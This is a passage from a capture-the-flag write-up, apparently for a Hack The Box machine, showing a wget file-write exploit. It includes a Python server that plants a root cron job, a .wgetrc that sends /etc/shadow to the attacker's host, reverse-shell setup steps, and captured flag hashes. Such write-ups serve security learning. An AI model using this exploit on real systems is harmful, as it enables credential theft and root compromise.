(post_body)<br/><br/>       print "Sending back a cronjob script as a thank-you for the file..." <br/>       print "It should get saved in /etc/cron.d/wget-root-shell on the victim's host (because of .wgetrc we injected in the GET first response)"<br/>       self.send_response(200)<br/>       self.send_header('Content-type', 'text/plain')<br/>       self.end_headers()<br/>       self.wfile.write(ROOT_CRON)<br/><br/>       print "\nFile was served. Check on /root/hacked-via-wget on the victim's host in a minute! :) \n"<br/><br/>       return<br/><br/>HTTP_LISTEN_IP = '192.168.57.1'<br/>HTTP_LISTEN_PORT = 80<br/>FTP_HOST = '192.168.57.1'<br/>FTP_PORT = 21<br/><br/>ROOT_CRON = "* * * * * root /usr/bin/id &gt; /root/hacked-via-wget \n"<br/><br/>handler = SocketServer.TCPServer((HTTP_LISTEN_IP, HTTP_LISTEN_PORT), wgetExploit)<br/><br/>print "Ready? Is your FTP server running?"<br/><br/>sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)<br/>result = sock.connect_ex((FTP_HOST, FTP_PORT))<br/>if result == 0:<br/>   print "FTP found open on %s:%s. Let's go then\n" % (FTP_HOST, FTP_PORT)<br/>else:<br/>   print "FTP is down :( Exiting."<br/>   exit(1)<br/><br/>print "Serving wget exploit on port %s...\n\n" % HTTP_LISTEN_PORT<br/><br/>handler.serve_forever()<br/><br/><br/><br/></div>
<div class="page" id="part 1: prepare malicious .wgetrc file on attack machine"><h1><b><u>part 1: prepare malicious .wgetrc file on attack machine</u></b></h1><img alt="images/898-1.png" src="images/898-1.png"/><br/><br/><br/><span style="color:#ffa500;">cat &lt;&lt;_EOF_&gt;.wgetrc<br/>post_file = /etc/shadow<br/>output_document = /etc/cron.d/wget-root-shell<br/>_EOF_</span><br/><br/>Suggestion: <span style="color:#24ff00;">copy paste this code into the target box's </span><span style="color:#ffa500;">/dev/shm</span><span style="color:#24ff00;"> directory (so it gets deleted on reboot)</span><br/><br/><br/><br/><br/><br/><br/><br/><br/><br/></div>
<div class="page" id="part 2: set up ftp server on port 21  (w/ authbind)"><h1><b><u>part 2: set up ftp server on port 21  (w/ authbind)</u></b></h1><span style="color:#ffa500;">authbind python -m pyftpdlib -p21 -w</span><br/><img alt="images/899-1.png" src="images/899-1.png"/><br/><br/></div>
<div class="page" id="part 3: exploit.py"><h1><b><u>part 3: exploit.py</u></b></h1><span style="color:#24ff00;">copy and paste the</span><span style="color:#ffa500;"> exploit.py</span><span style="color:#24ff00;"> script from the exploit tab and tweak the following to reflect the</span><span style="color:#ffa500;"> HTTP IP</span><span style="color:#24ff00;"> and the </span><span style="color:#ffa500;">FTP ip </span><span style="color:#24ff00;">as well as the </span><span style="color:#ffa500;">reverse shell</span><span style="color:#24ff00;"> code to connect back to our attacking machine<br/></span><img alt="images/897-1.png" src="images/897-1.png"/><br/><br/>now run both the<span style="color:#ffa500;"> ftp server</span><span style="color:#24ff00;"> and the </span><span style="color:#ffa500;">exploit.py </span><span style="color:#24ff00;">(which runs the http server) both with </span><span style="color:#ffa500;">authbind</span><span style="color:#24ff00;"> and wait for the </span><span style="color:#ffa500;">cronjob</span><span style="color:#24ff00;"> to execute:<br/></span><img alt="images/897-2.png" src="images/897-2.png"/><br/><br/>first run of the <span style="color:#ffa500;">cron</span><span style="color:#24ff00;"> gets us this response:<br/></span><img alt="images/897-3.png" src="images/897-3.png"/><br/><br/></div>
<div class="page" id="root"><h1><b><u>root</u></b></h1><img alt="images/900-1.png" src="images/900-1.png"/><br/><span style="color:#24ff00;">we see we are root of the machine </span><span style="color:#ffa500;">10.0.3.133</span><br/><br/><img alt="images/900-2.png" src="images/900-2.png"/><br/><br/><img alt="images/900-3.png" src="images/900-3.png"/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/901-1.png" src="images/901-1.png"/><span style="color:#ffff00;"><br/>93f844f50491ef797c9c1b601b4bece8<br/><br/></span><img alt="images/901-2.png" src="images/901-2.png"/><br/>950d1425795dfd38272c93ccbb63ae2c</div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><br/><img alt="images/1973-1.png" src="images/1973-1.png"/><br/></div>
</div></body></html>